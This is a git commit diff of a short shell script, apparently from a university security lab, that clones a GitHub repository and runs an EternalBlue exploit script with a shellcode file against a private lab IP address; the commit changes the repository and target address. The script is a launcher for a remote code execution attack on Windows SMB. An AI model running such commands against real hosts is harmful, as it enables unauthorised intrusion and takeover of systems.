006a5a242644f6efffd514c6a4ecc2b90248e9e0
ITLTVPo <57531319+ITLTVPo@users.noreply.github.com>
2021-06-13 20:08:13 +0700

    Add files via upload

--- shell_script.sh
+++ shell_script.sh
@@ -1,4 +1,6 @@
 #!/bin/sh
-git clone https://github.com/luckystars0612/NT230.L21.ANTN--Lab4_18520609.git
-cd NT230.L21.ANTN--Lab4_18520609
-python eternalblue_exploit7.py 192.168.14.150 shellcode.bin
+git clone https://github.com/ITLTVPo/NT230.L21.ANTN.git
+cd NT230.L21.ANTN
+python eternalblue_exploit7.py 192.168.14.132 shellcode.bin
+
+
